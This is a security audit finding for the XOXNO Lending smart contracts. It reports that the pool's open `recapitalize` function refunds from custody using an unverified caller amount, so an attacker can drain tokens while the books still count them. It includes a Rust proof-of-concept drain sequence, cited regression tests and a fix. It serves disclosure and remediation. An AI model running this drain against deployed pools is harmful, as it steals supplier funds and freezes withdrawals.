### Title
Unfunded `recapitalize` refund drains pool custody while the cash book still claims it — double-accounted reserves - (File: contracts/pool/src/ops/recapitalize.rs)

### Summary
The kernel bug class is a resource destroyed twice: once in an error path and once in teardown, so the same object is accounted in two places. The analog in XOXNO Lending is `recapitalize` on the pool: the pool pays the "excess" refund out of its own custody based on the caller-supplied `amount`, not on a measured receipt, while the cash book continues to count those same tokens as supplier backing. The same reserve is spent (refunded to the payer) and simultaneously retained (still claimed by `state.cash`) — a double-count/double-spend of custody, the financial equivalent of a double-free.

### Finding Description
The controller-side `recapitalize` prefunds the pool with `transfer_amount_measured` and passes only the measured `received` to `pool_recapitalize_call`, so the controller path is safe [1](#0-0) . However, the pool's own `recapitalize` entrypoint trusts its `amount` argument: it credits up to the backing shortfall and refunds the remainder to `payer` from pool custody, without verifying that `amount` was actually received. The in-repo regression test proves the reachable state transition: a fresh payer with no tokens calls `recapitalize(hub_asset, payer, custody)`, the pool's token balance drops to zero, yet `state.cash` still reports the pre-drain figure [2](#0-1) . Because `recapitalize` is documented as an open (unauthenticated-role) entrypoint — "Measured backing injection; refund surplus" with `None` authorization — the payer-side refund is reachable by any unprivileged address [3](#0-2) .

### Impact Explanation
Theft of user funds followed by permanent freezing of funds. The attacker receives tokens that the cash book still attributes to suppliers. After the drain, a legitimate supplier's `withdraw` passes the pool's own liquidity guards (`require_reserves` reads the inflated book) and then fails inside the SAC transfer with the raw balance error, so the market reports itself solvent yet cannot pay [4](#0-3) . The rollback leaves the book still overstating custody, so every subsequent supplier exit on that market is frozen until external recapitalization.

### Likelihood Explanation
No privileged role, timing, or oracle condition is required: the attacker only needs to know the pool's token balance and call the pool (or any reachable wrapper that forwards an unverified `amount`) with `payer` set to an address they control and `amount` equal to the pool's custody. The refund leg pays `amount - credited`; when the market shows zero shortfall, `credited = 0` and the entire `amount` is refunded from custody. The production test demonstrates this exact sequence end-to-end [5](#0-4) . One residual uncertainty: whether production pools additionally require controller auth on `recapitalize` could not be fully confirmed within the indexed code; the test executes the call through the real pool entrypoint, and the endpoints reference lists the operation as open, so the finding stands on the reachable surface.

### Recommendation
In `contracts/pool/src/ops/recapitalize.rs`, measure the actual custody delta instead of trusting `amount`: snapshot `token::balance(pool)` before crediting, require the caller to prefund first (or accept the tokens via a measured `transfer` from `payer`), cap `credited` at `min(shortfall, measured_receipt)`, and refund at most `measured_receipt - credited`. Additionally, after applying the credit, assert the pool balance covers `state.cash` (book-vs-custody parity check) so an unfunded refund can never commit.

### Proof of Concept
```rust
// Modeled on contracts/pool/tests/flows.rs::test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody
let t = TestSetup::new();
let token = token::Client::new(&t.env, &t.asset);
let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
let attacker = Address::generate(&t.env);   // holds zero tokens

// Seed a legitimate supplier position (custody and book agree).
let deposit = 10_000_000_000i128;
token_admin.mint(&t.pool, &deposit);
t.client().supply(&t.sup(0, deposit));

// Attacker drains all custody via an unfunded refund:
// credited = 0 (no shortfall), refund = amount paid from pool custody.
let custody = token.balance(&t.pool);
t.client().recapitalize(&hub(&t.asset), &attacker, &custody);
assert_eq!(token.balance(&t.pool), 0);                 // theft committed
assert!(t.state_snapshot().cash >= deposit);           // book still claims the funds

// Supplier exit now fails inside the SAC transfer (BalanceError = 10),
// not in any pool guard — funds are permanently frozen absent recap.
let outcome = t.client().try_withdraw(&receiver, &false, &t.wdr(shares, i128::MAX, 0));
assert!(outcome.is_err());
```

### Citations

**File:** contracts/controller/src/markets.rs (L153-163)
```rust
    // Prefund the pool and credit only its measured receipt.
    let received = payments::transfer_amount_measured(
        env,
        &hub_asset.asset,
        &payer,
        &pool_addr,
        amount,
        GenericError::AmountMustBePositive,
    );

    pool_recapitalize_call(env, &pool_addr, &hub_asset, &payer, received).actual_amount
```

**File:** contracts/pool/tests/flows.rs (L3407-3439)
```rust
#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );
```

**File:** contracts/pool/tests/flows.rs (L3441-3481)
```rust
    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
```

**File:** docs/reference/endpoints.md (L40-40)
```markdown
| `recapitalize(payer: Address, hub_asset: HubAssetKey, amount: i128) -> i128` | None | open | Measured backing injection; refund surplus; return amount applied. |
```
